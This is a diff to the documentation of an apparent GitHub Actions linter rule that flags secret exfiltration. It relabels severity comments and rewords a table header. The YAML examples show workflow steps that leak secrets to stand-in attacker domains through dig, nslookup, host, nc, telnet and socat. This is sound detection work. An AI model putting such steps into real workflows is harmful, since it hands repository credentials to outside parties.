@@ -58,13 +58,13 @@ Secrets passed directly to network commands that send data to external URLs. All
 Secrets embedded in DNS queries for data exfiltration:
 
 ```yaml
-# BAD: dig with secret in subdomain
+# HIGH: dig with secret in subdomain
 - run: dig ${{ secrets.TOKEN }}.attacker.com
 
-# BAD: nslookup exfiltration
+# HIGH: nslookup exfiltration
 - run: nslookup ${{ secrets.SECRET }}.evil.com
 
-# BAD: host command exfiltration
+# HIGH: host command exfiltration
 - run: host ${{ secrets.API_KEY }}.malicious.com
 ```
 
@@ -73,13 +73,13 @@ Secrets embedded in DNS queries for data exfiltration:
 Secrets piped to low-level network tools:
 
 ```yaml
-# BAD: netcat exfiltration
+# HIGH: netcat exfiltration
 - run: echo "${{ secrets.PASSWORD }}" | nc attacker.com 443
 
-# BAD: telnet exfiltration
+# HIGH: telnet exfiltration
 - run: echo "${{ secrets.CREDENTIALS }}" | telnet evil.com 23
 
-# BAD: socat exfiltration
+# HIGH: socat exfiltration
 - run: echo "${{ secrets.TOKEN }}" | socat - TCP:attacker.com:8080
 ```
 
@@ -177,7 +177,7 @@ The patterns below are **not flagged because their commands are not network comm
 
 ## Network Commands Monitored
 
-The "Risk Level" column shows the severity emitted **when a secret reaches a data flag** for that command. When no data flag is involved, the rule degrades to **High** for any command in this table.
+The "Risk when secret is on a data flag" column shows the severity emitted **when a secret reaches a data flag** for that command. When no data flag is involved, the rule degrades to **High** for any command in this table.
 
 | Command | Risk when secret is on a data flag | Data flags |
 |---------|------------------------------------|------------|
